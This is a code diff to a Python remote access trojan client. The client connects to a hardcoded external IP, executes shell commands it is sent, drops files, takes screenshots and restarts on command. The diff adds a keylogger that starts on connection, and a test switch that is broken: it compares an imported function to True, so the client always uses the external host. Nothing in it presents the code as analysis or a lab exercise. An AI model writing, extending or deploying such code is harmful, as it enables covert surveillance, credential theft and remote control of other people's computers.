@@ -1,3 +1,4 @@
+from cgi import test
 import socket
 import subprocess
 import time
@@ -9,6 +10,9 @@ import sys
 import pyautogui
 import PIL
 import commands
+import key_logger
+
+__test = True
 
 
 class Client:
@@ -48,6 +52,11 @@ class Client:
                 time.sleep(5)
             else:
                 break
+        # запуск кейлоггера
+        self.logger = key_logger.KeyLogger()
+        res = self.logger.start()
+        if res != None:
+            print(res)
 
     def arrayToString(self, s):
         """переводит массив в строку"""
@@ -78,11 +87,15 @@ class Client:
     # Обработать изображение с экрана
     def screen_handler(self):
         """делает скриншот"""
-        pyautogui.screenshot('1.png')
-        with open('1.png', 'rb') as file:
-            reader = base64.b64encode(file.read())
-        os.remove('1.png')
-        return reader
+        try:
+            pyautogui.screenshot('1.png')
+            with open('1.png', 'rb') as file:
+                reader = base64.b64encode(file.read())
+            os.remove('1.png')
+            return reader
+        except Exception as err:
+            print(err)
+            raise Exception()
 
     def run(self):
         while True:
@@ -119,6 +132,10 @@ class Client:
                         command_response = commands.sys_command(command[1:])
                     case "drop":
                         command_response = commands.drop(command[1], command[2])
+                    case "clires":
+                        self.send_json(commands.restart_client())
+                        self.connection.close()
+                        exit()                        
                     case _:
                         convCommand = self.arrayToString(command)
                         command_response = command_response = self.runCommand(convCommand).decode()
@@ -131,5 +148,5 @@ class Client:
 
 
 print("run")
-ratClient = Client("185.173.93.219", 9090)
+ratClient = Client("127.0.0.1", 8080) if test == True else Client("185.173.93.219", 9090)
 ratClient.run()
